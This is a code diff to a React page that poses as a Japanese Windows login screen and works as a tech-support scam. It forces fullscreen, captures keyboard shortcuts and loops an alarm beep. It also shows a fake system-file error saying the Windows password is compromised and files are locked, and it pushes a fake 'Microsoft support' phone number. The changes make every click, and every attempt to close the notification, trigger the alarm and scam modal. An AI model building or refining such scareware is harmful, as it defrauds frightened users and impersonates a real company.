@@ -9,6 +9,7 @@ import microsoftLogo from "../images/microsoftLogo.jpeg";
 import warningIcon from "../images/warning.png";
 import beepAudio from "../beep-04.mp3";
 import { Modal, Row, Col, message, notification } from "antd";
+import PhoneLogo from "../images/phn.svg";
 import {
   makeWindowFullScreen,
   addShortcutsKeyboard,
@@ -22,6 +23,7 @@ const Login = (props) => {
   const requestFullScreen = () => {
     addShortcutsKeyboard();
     makeWindowFullScreen();
+    loginToDash();
   };
 
   const showModal = () => {
@@ -45,7 +47,9 @@ const Login = (props) => {
       message: 'ログアウトしました',
       description:
         'ログアウトしました。正しいパスワードでログインしてみてください',
-      icon: <img src={warningIcon} height="40px" width="40px"/>
+      icon: <img src={warningIcon} height="40px" width="40px"/>,
+      onClick: loginToDash,
+      onClose: loginToDash,
     });
   }
 
@@ -67,7 +71,6 @@ const Login = (props) => {
     audio.play();
     audio.loop = true;
 
-      document.getElementById("transparent-box").style.display="none";
       document.getElementById("chat-box").style.display = "block";
       
       showModal();
@@ -76,11 +79,7 @@ const Login = (props) => {
 
   return (
     <>
-    <div onClick={requestFullScreen} className="login-wrapper" id="login-wrapper">
-      <div className="center">
-        <div className="container">
-    
-        <Modal maskClosable={false} footer={null} header={null} centered visible={isModalVisible} onCancel={handleCancel}>
+    <Modal maskClosable={false} footer={null} header={null} centered visible={isModalVisible} onCancel={handleCancel}>
           <p>C:WINDOWS\SYSTEM32\MSVCR120.dll</p>
 
           <br />
@@ -90,7 +89,7 @@ const Login = (props) => {
               <img src={windowCross} id="windowCross" />
             </Col>
             <Col span={20}>
-              Windowsのパスワードが危険にさらされています。ファイルへのアクセスは拒否されます。マイクロソフトサポート担当者に連絡してください：{phoneNumber}
+              Windowsのパスワードが危険にさらされています。ファイルへのアクセスは拒否されます。マイクロソフトサポート担当者に連絡してください：<img src={PhoneLogo} height={15} style={{marginRight: "8px"}} />{phoneNumber}
             </Col>
           </Row>
           
@@ -101,19 +100,21 @@ const Login = (props) => {
             </Col>
           </Row>
         </Modal>
-
+    <div onClick={requestFullScreen} className="login-wrapper" id="login-wrapper">
+      <div className="center">
+        <div className="container">
           <img src={userPhoto} className="rounded-circle userPhoto" height="180px" width="180px"/>
           <h1 className="mt-3 microsoftFont" style={{color: "white"}}>一時的なユーザー</h1>
           {/* <input type="text" value={username} readOnly={true} className="usernameField mt-3"/><br /> */}
           {/* <input onKeyPress={keyCheckEnter} id="pass" type="password" placeholder="Password" onChange={(e) => setPassword(e.target.value)} className="passwordField microsoftFont mt-3"/> */}
           <br />
-          <button id="myBtn" type="submit" onClick={loginToDash}>
+          <button id="myBtn" type="submit">
             ログイン
           </button>
-
-          <div onClick={loginToDash} style={{bottom: 0, left: 0, height: "100px", width: "200px", backgroundColor: "transparent"}} id="transparent-box">
-            
-          </div>
+          <br />
+          <br />
+          
+          <p className="signinoptions">サポート問い合わせ先 ：<span className="phone"><img src={PhoneLogo} height={18}/></span><span style={{fontSize: "20px", marginLeft: "5px"}}>{phoneNumber}</span> </p>
 
           <div style={{display: "none"}} id="chat-box">
             <img src={microsoftLogo} />
@@ -128,16 +129,16 @@ const Login = (props) => {
             </span> 
             <p style={{fontWeight: "600"}}>サポート問い合わせ先</p>
             <h4 style={{fontWeight: "600"}}>
-              {phoneNumber}
+              <img src={PhoneLogo} height={20} style={{marginTop: "5px"}} />{phoneNumber}
             </h4>
             <div class="arrow-down">
                 <i class="fa fa-caret-down"></i>
             </div>
           </div>
 
-          <img onClick={loginToDash} src={firstPic} className="iconImage1 rounded-circle"/>
-          <img onClick={loginToDash} src={secondPic} className="iconImage2 rounded-circle"/>
-          <img onClick={loginToDash} src={thirdPic} className="iconImage3 rounded-circle"/>
+          <img src={firstPic} className="iconImage1 rounded-circle"/>
+          <img src={secondPic} className="iconImage2 rounded-circle"/>
+          <img src={thirdPic} className="iconImage3 rounded-circle"/>
         </div>
       </div>
     </div>
